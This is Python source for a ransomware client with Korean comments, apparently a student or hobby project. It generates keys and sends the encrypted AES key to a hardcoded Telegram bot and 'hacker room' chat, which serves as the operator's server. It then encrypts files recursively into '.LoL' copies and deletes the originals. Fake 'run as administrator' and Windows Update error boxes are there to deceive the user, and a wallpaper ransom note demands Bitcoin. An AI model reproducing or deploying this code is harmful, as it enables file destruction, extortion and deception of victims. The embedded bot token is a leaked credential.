import telegram, asyncio                    #텔레그램 송수신용
from nacl.public import PrivateKey, PublicKey, Box     #공개키암호
import nacl, nacl.secret
from datetime import datetime               #시간정보
from time import sleep                      #딜레이
import os, sys, ctypes, tkinter                              #파일 내부 디렉토리
from tkinter import messagebox
from threading import Thread
import threading
import time
from multiprocessing import Process
from PIL import Image, ImageDraw, ImageFont
from tkinter import Label, Entry

#0. 기본 환경설정
#asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

PRIVATE_KEY_RSA_FILENAME=f"KEY_FILE"
PRIVATE_KEY_RSA=0
PUBLIC_KEY_RSA=0

PRIVATE_KEY_AES_FILENAME=f"KEY_FILE2"
PRIVATE_KEY_AES=0

PUBLIC_SERVER_RSA_KEY=PublicKey(b'=\xe5!\xfb\xf0\x82\xa2\x1f\x070\x0c\xad\xdcR\x16=\x03\\\xa8\x11\xc6\xa4\xa3\xd7,Kn;\n\xb8\xcd.')

AES_BOX=0

BOT=telegram.Bot(token='6516628933:AAHr__4L6DnlSiBXptkMsKi8DhvPwanGrJQ')#봇 토큰
CHAT_ID=5911780078#해커방

EncryptModule=0

MaxThread=120
ThreadPool=[]
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[]
PathList_DEBUG=[]

#1. RSA개인키 생성_스크립트 인자로 key path를 입력받으면 해당 내용을 읽어 로드(.py "privatePath")
def makeRSAKey():
    global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA
    if os.path.isfile(PRIVATE_KEY_RSA_FILENAME):
        print("[DEBUG] Loading ClientPrivateKey...")
        with open(PRIVATE_KEY_RSA_FILENAME, 'rb') as File:
            byteCode=File.read()
        PRIVATE_KEY_RSA=PrivateKey(byteCode)
        print("************")
        print(type(PRIVATE_KEY_RSA))
        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
        print("[DEBUG] Loaded ClientPrivateKey")
        print(PRIVATE_KEY_RSA._private_key)
        print("[DEBUG] Derived ClientPublicKey")
        print(PUBLIC_KEY_RSA)
        print("[DEBUG] Key is completely Loaded!")
    else:
        print("[DEBUG] WARINING_Previous ClientRSAKey will be removed and we will create new key after 30 seconds. After covering key, we cannot decrypt your file. RESTORE KEY FILE")
        sleep(30)
        print("[DEBUG] Making ClientPrivateKey by using script argument...")
        PRIVATE_KEY_RSA=PrivateKey.generate()
        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
        with open(PRIVATE_KEY_RSA_FILENAME, 'wb') as File:
            File.write(PRIVATE_KEY_RSA._private_key)
        print("[DEBUG] Created ServerPrivateKey")
        print(PRIVATE_KEY_RSA._private_key)
        print("[DEBUG] Derived ServerPublicKey")
        print(PUBLIC_KEY_RSA)
        print("[DEBUG] Key is completely Saved!")

#2. AES 대칭키 생성
def makeAESKey():
    global PRIVATE_KEY_AES
    if os.path.isfile(PRIVATE_KEY_AES_FILENAME):
        print("[DEBUG] Loading AESKey...")
        with open(PRIVATE_KEY_AES_FILENAME, 'rb') as File:
            PRIVATE_KEY_AES=File.read()
        print("[DEBUG] Loaded AESKey")
        print(PRIVATE_KEY_AES)
    else:
        print("[DEBUG] WARINING_Previous AESKey will be removed and we will create new key after 30 seconds. After covering key, we cannot decrypt your file. RESTORE KEY FILE")
        sleep(30)
        print("[DEBUG] Making AESKey by using script argument...")
        PRIVATE_KEY_AES=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        with open(PRIVATE_KEY_AES_FILENAME, 'wb') as File:
            File.write(PRIVATE_KEY_AES)
        print("[DEBUG] Created AESKey")
        print(PRIVATE_KEY_AES)


#3. AES 대칭키 암호화
def encryptAES():
    global AES_BOX
    print("[DEBUG] Encrypting AESKey...")
    AES_BOX=Box(PRIVATE_KEY_RSA, PUBLIC_SERVER_RSA_KEY)
    encrypted_aes_key=AES_BOX.encrypt(PRIVATE_KEY_AES)
    print("[DEBUG] Complete Encryption")
    print(encrypted_aes_key)
    return encrypted_aes_key

#4. 클라이언트 공개키와 암호화된 대칭키 파일을 서버에 전송
async def sendTelegram(chat_id, msg):
    await BOT.send_message(chat_id, msg)
    
def sendKeyToServer(encrypted_aes_key):
    print(type(str(PRIVATE_KEY_RSA._private_key)), type(str(encrypted_aes_key)))
    print('[DEBUG] Sending key information to Server...')
    loop = asyncio.get_event_loop() # 이벤트 루프를 얻음
    loop.run_until_complete(sendTelegram(CHAT_ID, "ClientRSAPublicKey: ")) # 끝날 때까지 기다림
    #loop.close
    loop = asyncio.get_event_loop() 
    loop.run_until_complete(sendTelegram(CHAT_ID, str(PUBLIC_KEY_RSA))) 
    #loop.close
    loop = asyncio.get_event_loop()
    loop.run_until_complete(sendTelegram(CHAT_ID, "EncryptedClientAESKey: "))
    #loop.close
    loop = asyncio.get_event_loop()  
    loop.run_until_complete(sendTelegram(CHAT_ID, str(encrypted_aes_key)))
    #loop.close
    print('[DEBUG] Complete Sending')

#6. 암호화 진행(현재 키 생성완료)
class EnDecryptor:
    def __init__(self, files=0, encryptModule=0):
        self._files=files
        self._encryptModule=encryptModule

    def encryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return
                    with open(file, "rb") as File:
                        data=File.read()
                    encryptedFile=self._encryptModule.encrypt(data)
                    with open(f"{file}.LoL", "wb") as File:
                        File.write(encryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")

    def decryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return
                    originName=file.strip(".LoL")
                    with open(file, "rb") as File:
                        data=File.read()
                    decryptedFile=self._encryptModule.decrypt(data)
                    with open(originName, "wb") as File:
                        File.write(decryptedFile)
                    os.remove(file)

        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")

def setEncryptModule():
    global EncryptModule
    EncryptModule=nacl.secret.SecretBox(PRIVATE_KEY_AES)
    print('[DEBUG] Created AES Modyle')

def listUpTargetDir():
    global PathList, PathList_DEBUG
    #PathList=[r"C:\Users\\"]
    #for letter in range(97, 123):
    #    drive=f"{chr(letter)}:\\"
    #    if (pathlib.Path(drive).exists()):
    #        PathList.append(drive)
    #PathList.remove("c:\\")
    #print(f"[DEBUG] PathList: {PathList}")
    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\StarCraft"]#테스트용 타겟 경로"E:\\github\\-ransomware\\최지웅\\test"

def recursiveEncrypt(basepath):
    global ThreadPool
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        th=Thread(target=EnDecryptor(files, EncryptModule).encryptFile())
        ThreadPool.append(th)
        th.start()
        #EnDecryptor(files, EncryptModule).encryptFile()
    for dir in dirs:
        recursiveEncrypt(dir)

def recursiveDecrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        th=Thread(target=EnDecryptor(files, EncryptModule).decryptFile())
        ThreadPool.append(th)
        th.start()
        #EnDecryptor(files, EncryptModule).decryptFile()
    for dir in dirs:
        recursiveDecrypt(dir)

#기타 함수
def fakeAdmin():#관리자 권한 실행 유도
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

def fakeAlert():#관리자 권한 실행 유도
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Windows 업데이트 작업 중...", "컴퓨터를 끄지 마십시오")

#암호화 경고
def changeBackground():
    try:        # Run Try/Except So We Dont Run in to Error
        Img = Image.new('RGB', (GetSystemMetrics(0), GetSystemMetrics(1)), color = (0, 0, 0))   # Getting Window Heihgt & Weight To Make Background

        Canvas= ImageDraw.Draw(Img)                                                             # Drawing Image
        font = ImageFont.truetype("arial", int(GetSystemMetrics(1)/20))                         # Getting Right Font Size          
        Canvas.text(
            (10,10), (r"""
                Your data Is encrypted  In order to Get your
                    > date back Send me (YOUR PRICE USD) in BTC to this Wellt
                    > and then email me for your key
                    > YOUR WELLET
                    > GoodLuck :)
                    > ~ YOUR NAME """), 
                fill=(255,0,0),font=font)                                                       # Write Text On Image                                                        
        Img.save('Bg.png')                                                                      # Save Image as bg.png
        ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\Bg.png' , 0)         # Set New Background Up

    except:
        pass

#복호화
def decryptComputer(AESKey): #여기서 프로그램 분리시켜야할듯. 현재 이미 AES가 있음.
    for drive in PathList_DEBUG:
        print('[DEBUG] 복호화 시작')
        start=time.time()
        recursiveDecrypt(drive)#암호화 수행
        while (len(ThreadPool)!=0):
            th=ThreadPool.pop()
            th.join()
            print("[DEBUG] join")
        end=time.time()
        print("[DEBUG] 복호화 완료_ 암호화 시간", end-start,' seconds')
    
    
def ransomewareWarning():
    WINDOW=tkinter.Tk()
    WINDOW.title('Ransomware Warning')
    WINDOW.geometry('300x100')
    WINDOW.resizable(False, False)

    lab=Label(WINDOW)
    lab['text']='Input Key for Decryption: '
    lab.pack()
    entry=Entry(WINDOW)
    entry.bind('<Return>', decryptComputer(entry.get()))
    entry.pack()
    lab2=Label(WINDOW)
    lab2['text']='If you turn off this window, You cannot get back your computer:)'
    lab2.pack()
    lab3=Label(WINDOW)
    lab3['text']='Send Message to @rans_key_bot by using telegram'
    lab3.pack()
    WINDOW.mainloop()
            
    
if __name__=='__main__':
    makeRSAKey()
    print()
    makeAESKey()
    print()
    encrypted_aes_key=encryptAES()
    print()
    sendKeyToServer(encrypted_aes_key)
    print()
    setEncryptModule()
    listUpTargetDir()

    if(IsAdmin==False):#디버그를 위한 강제실행
        #changeBackground()
        task_thread = threading.Thread(target=fakeAlert) # 후에 꺼지게 해야함.
        #task_thread.start()
        for drive in PathList_DEBUG:
            print("\n[DEBUG] ==============================================================================")
            print("[DEBUG] 암호화가 10초 뒤 진행될 예정입니다. 타겟디렉토리를 마지막으로 확인하세요: ", drive)
            print("[DEBUG] ==============================================================================\n")
            #sleep(10)
            print('[DEBUG] 암호화 시작')
            start=time.time()
            recursiveEncrypt(drive)#암호화 수행
            end=time.time()
            while (len(ThreadPool)!=0):
                th=ThreadPool.pop()
                th.join()
                print("[DEBUG] join")
            print("[DEBUG] 암호화 완료_ 암호화 시간", end-start,' seconds')

            #changeBackgound()

            #경고창 실행
            os.system('"./Client_after_enc.py"')# 이후 분리프로그램 실행_엥 직므 안됨.
            print('[DEBUG] END')
            sleep(5)
            exit(0)
            
    else:
        fakeAdmin()
    
    print('hello')
